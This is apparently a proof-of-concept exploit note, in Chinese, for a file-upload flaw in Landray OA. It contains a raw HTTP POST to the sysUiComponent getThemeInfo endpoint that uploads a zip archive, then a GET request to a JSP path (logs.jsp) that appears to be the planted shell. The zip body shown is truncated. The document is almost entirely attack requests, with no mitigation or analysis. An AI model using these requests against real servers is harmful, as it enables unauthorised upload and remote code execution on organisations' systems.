# 蓝凌oa zip上传

    fofa

## poc

```
POST /sys/ui/sys_ui_component/sysUiComponent.do?method=getThemeInfo&s_ajax=true HTTP/1.1
X-Real-IP: 
X-Forwarded-For: 
Host: 
X-Forwarded-Proto: https
X-B3-TraceId: a22c34f91eb9bd9e1326b3cc54aa23e9
X-B3-SpanId: a22c34f91eb9bd9e1326b3cc54aa23e9
Content-Length: 731
Content-Type: multipart/form-data; boundary=********************1692085217190
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A366 Safari/600.1.4
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Pragma: no-cache
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2

-********************1692085217190
Content-Disposition: form-data; name="file"; filename="data.zip"
Content-Type: application/x-zip-compressed

PK  
--********************1692085217190--
```

2.
GET /resource/ui-component/themes/logs.jsp HTTP/1.1
